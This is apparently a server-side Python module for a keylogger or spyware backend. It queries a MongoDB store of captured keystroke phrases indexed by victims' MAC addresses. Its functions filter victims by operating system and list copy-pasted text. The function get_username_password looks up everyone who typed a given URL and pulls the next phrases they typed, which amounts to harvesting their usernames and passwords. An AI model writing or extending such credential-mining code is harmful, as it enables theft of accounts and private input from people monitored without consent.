from server import database

def get_users_by_os(os):
    return database.db.users.find({"os": os})


def get_copied_phrases(n=100):
    pipeline = [
        {"$unwind": "$phrases"},
        {"$match": {"phrases.copy_pastaed": True}},
        {"$group": {"_id":"$phrases.phrase", "num": {"$sum":1}, "user_mac": {"$addToSet": "$mac"}}},
        {"$limit": int(n)},
        {"$project": {"_id": 0, "phrase": "$_id", "user_mac": 1, "num_occurences":"$num"}}
    ]
    return database.db.users.aggregate(pipeline)


def get_username_password(url, num=2):
    pipeline = [
        {"$unwind": "$phrases"},
        {"$match":{"phrases.phrase":url}},
        {"$project":{"mac":"$mac", "timestamp":"$phrases.start_timestamp"}},
    ]
    user_results = database.db.users.aggregate(pipeline)
    results_list = []
    for user_result in user_results:
        mac = user_result['mac']
        timestamp = user_result['timestamp']
        pipeline = [
            {"$unwind": "$phrases"},
            {"$match": {"mac":mac, "phrases.start_timestamp": {"$gt":timestamp}}},
            {"$limit": int(num)},
            {"$project": {"_id":0, "user_mac": "$mac", "phrase": "$phrases.phrase"}}
        ]
        results = database.db.users.aggregate(pipeline)
        for result in results:
            results_list.append(result)
    return results_list


def get_top_image_tags(n=100):
    pipeline = [
        {"$unwind": "$tags"},
        {"$group": {"_id":"$tags", "num": {"$sum":1}, "user_mac": {"$addToSet": "$mac"}}},
        {"$project": {"_id": 0, "tag": "$_id"}}
    ]
    users_tags = database.db.users.aggregate(pipeline)
    tags_dict = {}
    for user_tag in users_tags:
        tag = user_tag['tag']
        if tag in tags_dict:
            tags_dict[tag] += 1
        else:
            tags_dict[tag] = 1
    tags_list =  [(tag, tags_dict[tag]) for tag in sorted(tags_dict, key=tags_dict.get, reverse=True)]
    return tags_list[:int(n)]
